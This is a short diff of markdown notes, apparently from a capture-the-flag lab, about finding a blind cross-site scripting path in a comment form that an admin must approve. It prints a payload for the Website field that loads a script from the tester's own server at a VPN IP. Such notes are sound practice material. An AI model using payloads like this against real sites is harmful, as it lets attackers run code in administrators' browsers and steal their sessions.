@@ -60,7 +60,7 @@ This is the part I actually worked through, not just read about.
 - Spotted the note that comments must be approved by an admin, which strongly suggested a blind XSS path
 - Set up a local PHP server on my VPN IP and used port `8080` because port `80` was already taken
 - Tested a payload in the Website field:
-  ```html
+```html
   "><script src="http://10.10.14.77:8080/website"></script>
 ```
 
